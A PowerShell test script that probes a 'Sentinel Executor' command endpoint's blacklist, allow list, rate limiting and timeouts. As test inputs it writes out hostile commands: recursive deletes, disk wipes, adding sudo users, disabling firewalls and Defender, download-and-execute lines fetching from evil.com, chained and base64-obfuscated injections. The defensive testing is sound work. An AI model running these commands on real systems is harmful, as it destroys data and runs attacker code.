#Requires -Version 5.1
<#
.SYNOPSIS
    Command Validation Security Tests for Sentinel Executor
.DESCRIPTION
    Tests the command execution security including blacklist enforcement,
    rate limiting, and dangerous pattern detection.
.NOTES
    Security Fix: CW-002
    Author: Sentinel QA Team
#>

[CmdletBinding()]
param(
    [string]$AgentUrl = "http://localhost:8090",
    [string]$OutputPath = ".\TestResults"
)

$ErrorActionPreference = "Stop"
$script:Results = @{
    Component = "Executor-CommandValidation"
    Tests = @()
}

function Test-CommandBlocked {
    param(
        [string]$Command,
        [string]$Type = "bash",
        [string]$Description
    )

    $result = @{
        Name = "Blocked: $Description"
        Command = $Command
        Type = $Type
        Status = "Unknown"
    }

    try {
        $body = @{ command = $Command; type = $Type } | ConvertTo-Json
        $response = Invoke-RestMethod -Uri "$AgentUrl/api/execute" -Method POST -Body $body -ContentType "application/json" -ErrorAction Stop

        # If we get here without error, dangerous command was NOT blocked
        $result.Status = "Failed"
        $result.Error = "Dangerous command was NOT blocked - security vulnerability!"
        Write-Host "[FAIL] $Description - Command executed (VULNERABLE)" -ForegroundColor Red
    }
    catch {
        if ($_.Exception.Message -match "blacklisted|blocked|denied|validation failed|not in the whitelist") {
            $result.Status = "Passed"
            Write-Host "[PASS] $Description - Command blocked correctly" -ForegroundColor Green
        }
        else {
            $result.Status = "Inconclusive"
            $result.Error = $_.Exception.Message
            Write-Host "[WARN] $Description - $($_.Exception.Message)" -ForegroundColor Yellow
        }
    }

    $script:Results.Tests += $result
}

function Test-CommandAllowed {
    param(
        [string]$Command,
        [string]$Type = "bash",
        [string]$Description
    )

    $result = @{
        Name = "Allowed: $Description"
        Command = $Command
        Type = $Type
        Status = "Unknown"
    }

    try {
        $body = @{ command = $Command; type = $Type } | ConvertTo-Json
        $response = Invoke-RestMethod -Uri "$AgentUrl/api/execute" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 30

        $result.Status = "Passed"
        $result.Details = @{
            ExitCode = $response.exit_code
            Duration = $response.duration_ms
        }
        Write-Host "[PASS] $Description - Command allowed and executed" -ForegroundColor Green
    }
    catch {
        $result.Status = "Failed"
        $result.Error = $_.Exception.Message
        Write-Host "[FAIL] $Description - Valid command was blocked: $($_.Exception.Message)" -ForegroundColor Red
    }

    $script:Results.Tests += $result
}

function Test-BlacklistedPatterns {
    Write-Host "`n=== Blacklisted Pattern Tests ===" -ForegroundColor Cyan

    # Dangerous deletion commands
    Test-CommandBlocked -Command "rm -rf /" -Type "bash" -Description "rm -rf root"
    Test-CommandBlocked -Command "rm -rf ~" -Type "bash" -Description "rm -rf home"
    Test-CommandBlocked -Command "del /s /q C:\" -Type "cmd" -Description "del all C drive"

    # System modification
    Test-CommandBlocked -Command "dd if=/dev/zero of=/dev/sda" -Type "bash" -Description "dd overwrite disk"
    Test-CommandBlocked -Command "mkfs.ext4 /dev/sda1" -Type "bash" -Description "mkfs format disk"

    # User manipulation
    Test-CommandBlocked -Command "useradd attacker" -Type "bash" -Description "useradd"
    Test-CommandBlocked -Command "passwd root" -Type "bash" -Description "passwd change"
    Test-CommandBlocked -Command "usermod -aG sudo attacker" -Type "bash" -Description "usermod sudo"

    # Service manipulation
    Test-CommandBlocked -Command "systemctl stop firewalld" -Type "bash" -Description "stop firewall"
    Test-CommandBlocked -Command "service iptables stop" -Type "bash" -Description "stop iptables"

    # PowerShell dangerous operations
    Test-CommandBlocked -Command "Invoke-Expression (Get-Content malware.ps1)" -Type "powershell" -Description "IEX execution"
    Test-CommandBlocked -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')" -Type "powershell" -Description "Download and execute"
    Test-CommandBlocked -Command "Remove-Item C:\ -Recurse -Force" -Type "powershell" -Description "Remove-Item recursive"
    Test-CommandBlocked -Command "Set-ExecutionPolicy Unrestricted" -Type "powershell" -Description "Unrestricted execution policy"
    Test-CommandBlocked -Command "Stop-Service WinDefend" -Type "powershell" -Description "Stop Windows Defender"

    # Registry manipulation
    Test-CommandBlocked -Command "reg delete HKLM\SOFTWARE\Microsoft /f" -Type "cmd" -Description "reg delete"

    # Download and execute
    Test-CommandBlocked -Command "curl http://evil.com/shell.sh | bash" -Type "bash" -Description "curl pipe bash"
    Test-CommandBlocked -Command "wget http://evil.com/malware.sh | sh" -Type "bash" -Description "wget pipe sh"
    Test-CommandBlocked -Command "certutil -decode encoded.txt malware.exe" -Type "cmd" -Description "certutil decode"
}

function Test-PathBypass {
    Write-Host "`n=== Command Path Bypass Tests ===" -ForegroundColor Cyan

    # Path traversal in command
    Test-CommandBlocked -Command "/usr/bin/../../tmp/evil.sh" -Type "bash" -Description "Path traversal in command"
    Test-CommandBlocked -Command "/bin/../../../tmp/rm -rf /" -Type "bash" -Description "Traversal to dangerous command"
    Test-CommandBlocked -Command "C:\Windows\..\..\temp\malware.exe" -Type "cmd" -Description "Windows path traversal"
}

function Test-InjectionAttempts {
    Write-Host "`n=== Command Injection Tests ===" -ForegroundColor Cyan

    # Command chaining
    Test-CommandBlocked -Command "ls ; rm -rf /" -Type "bash" -Description "Semicolon chain to rm"
    Test-CommandBlocked -Command "dir && del /s /q C:\" -Type "cmd" -Description "AND chain to del"
    Test-CommandBlocked -Command "echo test | rm -rf /" -Type "bash" -Description "Pipe to rm"

    # Null byte injection
    Test-CommandBlocked -Command "ls\x00; rm -rf /" -Type "bash" -Description "Null byte injection"

    # Obfuscation attempts
    Test-CommandBlocked -Command "echo cm0gLXJmIC8= | base64 -d | bash" -Type "bash" -Description "Base64 obfuscation"
}

function Test-WhitelistedCommands {
    Write-Host "`n=== Whitelisted Command Tests ===" -ForegroundColor Cyan

    # System info commands (should be allowed)
    Test-CommandAllowed -Command "hostname" -Type "bash" -Description "hostname"
    Test-CommandAllowed -Command "whoami" -Type "bash" -Description "whoami"
    Test-CommandAllowed -Command "uptime" -Type "bash" -Description "uptime"
    Test-CommandAllowed -Command "df -h" -Type "bash" -Description "disk free"
    Test-CommandAllowed -Command "ps aux" -Type "bash" -Description "process list"

    # Windows equivalents
    Test-CommandAllowed -Command "hostname" -Type "cmd" -Description "hostname (cmd)"
    Test-CommandAllowed -Command "whoami" -Type "cmd" -Description "whoami (cmd)"
    Test-CommandAllowed -Command "systeminfo" -Type "cmd" -Description "systeminfo"

    # PowerShell safe cmdlets
    Test-CommandAllowed -Command "Get-Process" -Type "powershell" -Description "Get-Process"
    Test-CommandAllowed -Command "Get-Service" -Type "powershell" -Description "Get-Service"
    Test-CommandAllowed -Command "Get-ComputerInfo" -Type "powershell" -Description "Get-ComputerInfo"
}

function Test-RateLimiting {
    Write-Host "`n=== Rate Limiting Tests ===" -ForegroundColor Cyan

    $result = @{
        Name = "Rate Limiting"
        Status = "Unknown"
        Details = @{}
    }

    try {
        $successCount = 0
        $rateLimited = $false

        # Send 15 rapid requests (should hit rate limit)
        for ($i = 1; $i -le 15; $i++) {
            try {
                $body = @{ command = "echo test$i"; type = "bash" } | ConvertTo-Json
                $response = Invoke-RestMethod -Uri "$AgentUrl/api/execute" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 5
                $successCount++
            }
            catch {
                if ($_.Exception.Message -match "rate limit|too many|throttle") {
                    $rateLimited = $true
                    break
                }
            }
        }

        $result.Details.SuccessfulRequests = $successCount
        $result.Details.RateLimited = $rateLimited

        if ($rateLimited) {
            $result.Status = "Passed"
            Write-Host "[PASS] Rate limiting triggered after $successCount requests" -ForegroundColor Green
        }
        else {
            $result.Status = "Warning"
            Write-Host "[WARN] Rate limiting not triggered after 15 requests" -ForegroundColor Yellow
        }
    }
    catch {
        $result.Status = "Inconclusive"
        $result.Error = $_.Exception.Message
        Write-Host "[WARN] Rate limit test inconclusive: $($_.Exception.Message)" -ForegroundColor Yellow
    }

    $script:Results.Tests += $result
}

function Test-CommandTimeout {
    Write-Host "`n=== Command Timeout Tests ===" -ForegroundColor Cyan

    $result = @{
        Name = "Command Timeout"
        Status = "Unknown"
        Details = @{}
    }

    try {
        # Try to run a long-running command
        $body = @{ command = "ping -n 300 127.0.0.1"; type = "cmd" } | ConvertTo-Json

        $startTime = Get-Date
        try {
            $response = Invoke-RestMethod -Uri "$AgentUrl/api/execute" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 120
            $duration = ((Get-Date) - $startTime).TotalSeconds

            if ($response.exit_code -eq -2 -or $response.stderr -match "timeout") {
                $result.Status = "Passed"
                $result.Details.Duration = $duration
                Write-Host "[PASS] Command was terminated by timeout" -ForegroundColor Green
            }
            else {
                $result.Status = "Warning"
                $result.Details.Message = "Command completed without timeout"
                Write-Host "[WARN] Long-running command was not terminated" -ForegroundColor Yellow
            }
        }
        catch {
            if ($_.Exception.Message -match "timeout") {
                $result.Status = "Passed"
                Write-Host "[PASS] Request timed out (server-side timeout working)" -ForegroundColor Green
            }
            else {
                throw $_
            }
        }
    }
    catch {
        $result.Status = "Inconclusive"
        $result.Error = $_.Exception.Message
        Write-Host "[WARN] Timeout test inconclusive: $($_.Exception.Message)" -ForegroundColor Yellow
    }

    $script:Results.Tests += $result
}

# Main execution
Write-Host "=" * 60 -ForegroundColor Cyan
Write-Host "SENTINEL COMMAND VALIDATION SECURITY TESTS" -ForegroundColor Cyan
Write-Host "Security Fix: CW-002" -ForegroundColor Cyan
Write-Host "=" * 60 -ForegroundColor Cyan

Test-BlacklistedPatterns
Test-PathBypass
Test-InjectionAttempts
Test-WhitelistedCommands
Test-RateLimiting
Test-CommandTimeout

# Summary
$passed = ($script:Results.Tests | Where-Object { $_.Status -eq "Passed" }).Count
$failed = ($script:Results.Tests | Where-Object { $_.Status -eq "Failed" }).Count
$inconclusive = ($script:Results.Tests | Where-Object { $_.Status -in @("Inconclusive", "Warning") }).Count

Write-Host "`n" + "=" * 60 -ForegroundColor Cyan
Write-Host "RESULTS SUMMARY" -ForegroundColor Cyan
Write-Host "  Passed: $passed" -ForegroundColor Green
Write-Host "  Failed: $failed" -ForegroundColor $(if ($failed -gt 0) { "Red" } else { "Green" })
Write-Host "  Inconclusive/Warning: $inconclusive" -ForegroundColor Yellow
Write-Host "=" * 60 -ForegroundColor Cyan

if ($failed -gt 0) {
    Write-Host "`nWARNING: Security vulnerabilities detected!" -ForegroundColor Red
}

# Export results
if ($OutputPath) {
    if (-not (Test-Path $OutputPath)) {
        New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
    }
    $resultsFile = Join-Path $OutputPath "command-validation-results-$(Get-Date -Format 'yyyyMMdd-HHmmss').json"
    $script:Results | ConvertTo-Json -Depth 10 | Out-File $resultsFile
    Write-Host "Results exported to: $resultsFile"
}

return $script:Results
